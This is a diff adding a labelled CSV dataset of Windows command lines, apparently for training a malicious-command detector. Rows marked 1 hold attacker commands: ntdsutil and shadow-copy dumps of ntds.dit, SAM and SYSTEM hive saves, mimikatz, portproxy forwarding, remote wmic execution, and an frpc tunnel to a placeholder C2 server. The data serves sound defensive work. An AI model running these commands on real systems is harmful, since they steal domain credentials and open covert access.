@@ -1,0 +1,156 @@
+"command","label"
+"wmic.exe process call create ""cmd.exe /c ntdsutil.exe \""ac i ntds\"" ifm \""create full C:\Windows\Temp\Pro""","1"
+"ftp/getmac.exe /s srvmain /u maindom\hiropln /p p@ssW23 /fo table /nh","0"
+"lbpolicy set lun type=<type> [paths=<path>-{primary | <weight>}[,<path>-{primary | <weight>}[,…]]]","0"
+"tftp.exe  -i Host1 get boot.img","0"
+"cmd.exe /c ""netsh.exe interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9999 connectaddress= connectport=8443 protocol=tcp""","1"
+"xcopy.exe .\toc*.yml ..\..\Copy-To\ /S /Y
+rem Output example.
+rem  .\d1\toc.yml
+rem  .\d1\d12\toc.yml
+rem  .\d2\toc.yml
+rem  3 File(s) copied","0"
+"evntcmd.exe [/s <computername>] [/v <verbositylevel>] [/n] <filename>","0"
+"ntdsutil.exe snapshot “activate instance ntds”
+create quit quit","0"
+"Volume c: alias System1    GUID \\?\Volume{XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX}\","0"
+"Get-EventLog security -instanceid 4624","1"
+"wmic.exe process call create ""ntdsutil.exe \""ac i ntds\"" ifm \""create full C:\Windows\Temp\pro","1"
+"C:\Windows\Temp\tmp\Active Directory\ntds.dit","1"
+"activate instance ntds ifm","0"
+"Get-EventLog security -instanceid 4624 | Where-
+Object {$_.message.contains('{redacted user
+account}')} | select -First 1 | fl","1"
+"C:\Windows\NTDS\ntds.dit' to
+'\\?\GLOBALROOT\Device\{redacted}VolumeShadowC
+opy1\Windows\NTDS\ntds.dit'","1"
+"scanline.exe -t 192.168.1.0/24 -p 1-65535","1"
+"ktmutil.exe force commit {311a9209-03f4-11dc-918f-00188b8f707b}","0"
+"wecutil.exe ss sub1 /c:%Windir%system32WsSelRg2.xml","0"
+"xcopy.exe \customer h:\public\address /s /e /k /p /i","0"
+"cmd.exe"" /c wmic.exe process call create ""cmd.exe /c mkdir C:\windows\Temp\McAfee_Logs & ntdsutil.exe \""ac i ntds\"" ifm \""create full C:\Windows\Temp\McAfee_Logs\","1"
+"$DCs = Get-ADDomainController -Filter /$startDate = (get-date).AddDays(-1)/foreach ($DC in $DCs){
+$slogonevents = Get-Eventlog -LogName
+Security -ComputerName $DC.Hostname -
+after $startDate | where {$_.eventID -eq
+4624 }}/foreach ($e in $slogonevents){
+# Logon Successful Events
+# Local (Logon Type 2)
+if (($e.EventID -eq 4624 ) -and
+($e.ReplacementStrings[8] -eq 2)){
+write-host ""Type: Local Logon`tDate:
+""$e.TimeGenerated ""`tStatus:
+Success`tUser: ""$e.ReplacementStrings[5]
+""`tWorkstation: ""$e.ReplacementStrings[11]
+}/if (($e.EventID -eq 4624 ) -and
+($e.ReplacementStrings[8] -eq 10)){
+write-host ""Type: Remote Logon`tDate:
+""$e.TimeGenerated ""`tStatus:
+Success`tUser: ""$e.ReplacementStrings[5]
+""`tWorkstation: ""$e.ReplacementStrings[11]
+""`tIP Address: ""$e.ReplacementStrings[18]
+}}","1"
+"cmd.exe /Q /c wmic.exe process call create ""cmd.exe /c mkdir C:\Windows\Temp\tmp & ntdsutil.exe \""ac i ntds\"" ifm \""create full C:\Windows\Temp\tmp\"" 1> \\127.0.0.1\ADMIN$\ 2>&1","1"
+"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:68.0)               Gecko/20100101 Firefox/68.0","1"
+"dtrace.exe [-BCeFhlqSvVwYZ] [-b bufsz] [-c cmd] [-D name[=def]] [-I path]
+[-L path] [-o output] [-p pid] [-s script] [-U name] [-x opt[=val]] [-X a|c|s|t]
+[-y symbol path]
+[-P provider [[ predicate ] action ]] [-m [ provider: ]
+module [[ predicate ] action ]] [-f [[ provider: ] module: ]
+func [[ predicate ] action ]] [-n [[[ provider: ] module: ] func: ]
+name [[ predicate ] action ]] [-i probe-id [[ predicate ] action ]] [ args ... ]","0"
+"login target iadapter=<iadapter> [type={manual | persistent | boot}] [chap={none | oneway | mutual}] [iportal=<iportal>] [tportal=<tportal>] [<flag> [<flag> […]]]","0"
+"""C:\pstools\psexec.exe"" {REDACTED} -s cmd.exe /c ""cmd.exe /c netsh.exe
+interface portproxy delete v4tov4 listenaddress=0.0.0.0
+listenport=9999","1"
+"cscript.exe prndrvr -a -m Laser printer model 1 -v 3 -e Windows x64 -i c:\temp\Laserprinter1.inf -h c:\temp","0"
+"fc /a [/c] [/l] [/lb<n>] [/n] [/off[line]] [/t] [/u] [/w] [/<nnnn>] [<drive1>:][<path1>]<filename1> [<drive2>:][<path2>]<filename2>","0"
+"diskshadow/add/delete shadows [all | volume <volume> | oldest <volume> | set <setID> | id <shadowID> | exposed {<drive> | <mountpoint>}]","0"
+"# Establishes a TCP tunnel to the attacker's server
+frpc tcp -s <C2_SERVER_IP>:<PORT> -t <AUTH_TOKEN> --ue --uc -l <LOCAL_PORT> -r <REMOTE_PORT>","1"
+"create lun simple [size=<n>] [drives=<n>] [noerr]
+create lun stripe [size=<n>] [drives=<n, n> [,...]]  [stripesize=<n>] [noerr]
+create lun raid [size=<n>] [drives=<n, n> [,...]] [stripesize=<n>] [noerr]
+create lun mirror [size=<n>] [drives=<n, n> [,...]] [stripesize=<n>] [noerr]
+create lun automagic size=<n> [noerr]
+create target name=<name> [iscsiname=<iscsiname>] [noerr]
+create tpgroup [noerr]","0"
+"ac i ntds i","1"
+"eventcreate.exe /s server /u user /id 100 /t WARNING /d ""Remote machine with partial user credentials""","0"
+"ntdsutil.exe snapshot “ac i ntds”
+create quit quit","1"
+"arp.exe -a
+curl.exe www.ip-api[.]com
+dnscmd.exe . /enumrecords /zone {REDACTED}
+dnscmd.exe . /enumzones
+dnscmd.exe /enumrecords {REDACTED} . /additional
+ipconfig.exe /all
+ldifde.exe -f c:\windows\temp\<filename>.txt -p subtree
+net.exe localgroup administrators
+net.exe group /dom net.exe group ""Domain Admins"" /dom
+netsh.exe interface firewall show all
+netsh.exe interface portproxy show all
+netsh.exe interface portproxy show v4tov4
+netsh.exe firewall show all
+netsh.exe portproxy show v4tov4
+netstat.exe -ano
+reg.exe query hklm\software\
+systeminfo.exe
+tasklist.exe /v
+whoami.exe
+wmic.exe volume list brief
+wmic.exe service brief
+wmic.exe product list brief
+wmic.exe baseboard list full
+wevtutil.exe qe security /rd:true /f:text /q:*[System[(EventID=4624) and TimeCreated[@SystemTime>='{REDACTED}']] and EventData[Data='{REDACTED}']]","1"
+"HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\PortProxy\v4tov4
+\cp\0.0.0.0/49275 | {redacted IP address}/8443.","1"
+"netstat.exe -s -p tcp udp","0"
+"eventcreate.exe [/s <computer> [/u <domain\user> [/p <password>]] {[/l {APPLICATION|SYSTEM}]|[/so <srcname>]} /t {ERROR|WARNING|INFORMATION|SUCCESSAUDIT|FAILUREAUDIT} /id <eventID> /d <description>","0"
+"7z.exe a -p {REDACTED} c:\windows\temp\{REDACTED}.7z
+C:\Windows\system32\pcwrun.exe
+C:\Users\Administrator\Desktop\Win.exe
+C:\Windows\System32\cmdbak.exe /c ping -n 1 127.0.0.1 > C:\Windows\temp\putty.log C:\Windows\Temp\tmp.log
+""cmd.exe"" /c dir.exe \\127.0.0.1\C$ /od
+""cmd.exe"" /c ping –a –n 1 <IP address>
+""cmd.exe"" /c wmic.exe /user:<username> /password:<password> process call create ""net.exe stop \""<service name>\"" > C:\Windows\Temp\tmp.log""
+cmd.exe /Q /c cd 1> \\127.0.0.1\ADMIN$\__<timestamp value> 2>&1
+net.exe use \\127.0.0.1\IPC$ /y /d
+powershell.exe start-process -filepath c:\windows\temp\<filename>.bat -windowstyle Hidden
+rar.exe a –{REDACTED} c:\Windows\temp\{REDACTED} D:\{REDACTED}\
+wmic.exe /node:{REDACTED} /user:{REDACTED} /password:{REDACTED} cmd.exe /c whoami.exe
+xcopy.exe C:\windows\temp\hp d:\{REDACTED}","1"
+"ftp/gpresult.exe /s srvmain /u maindom\hiropln /p p@ssW23 /r","0"
+"cmd.exe /c vssadmin.exe create shadow /for=C: > C:\Windows\Temp\<filename>.tmp cmd.exe /c copy.exe \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\Windows\NTDS\ntds.dit C:\Windows\Temp > C:\Windows\Temp\<filename>.tmp","1"
+"dir.exe C:\Users\{REDACTED}\.ssh\known_hosts
+dir.exe C:\users\{REDACTED}\appdata\roaming\Mozilla\firefox\profiles
+mimikatz.exe
+reg.exe query hklm\software\OpenSSH
+reg.exe query hklm\software\OpenSSH\Agent
+reg.exe query hklm\software\realvnc
+reg.exe query hklm\software\realvnc\vncserver
+reg.exe query hklm\software\realvnc\Allusers
+reg.exe query hklm\software\realvnc\Allusers\vncserver
+reg.exe query hkcu\software\{REDACTED}\putty\session
+reg.exe save hklm\sam ss.dat
+reg.exe save hklm\system sy.dat","1"
+"cmd.exe /c netsh.exe interface portproxy add v4tov4 listenport=50100 listenaddress=0.0.0.0 connectport=1433 connectaddress=","1"
+"net localgroup Administrators pgwnooqy /add","0"
+"cmd.exe /Q /c *dir.exe 1> \\127.0.0.1\ADMIN$\__1684956600.123456 2>&1","1"
+"Get-EventLog security -instanceid 4624 -after
+{redacted date} | fl * | Out-File
+'C:\users\public\documents\user.dat'","1"
+"mklink.exe /d \MyFolder \Users\User1\Documents
+mklink.exe /h \MyFile.file \User1\Documents\example.file
+rd \MyFolder
+del \MyFile.file","0"
+"wmic.exe process call create ""cmd.exe /c mkdir C:\Windows\Temp\tmp & ntdsutil.exe \""ac i ntds\"" ifm \""create full C:\Windows\Temp\tmp\","1"
+"@echo off
+rem  This batch program formats and checks new disks.
+rem  It is named Checknew.bat.
+rem
+rem echo Insert new disk in Drive B.
+pause
+format b: /v chkdsk b:","0"
+"ftype.exe txtfile /assoc.exe .pl=PerlScript
+ftype.exe PerlScript=perl.exe %1 %*/set PATHEXT=.pl;%PATHEXT%","0"
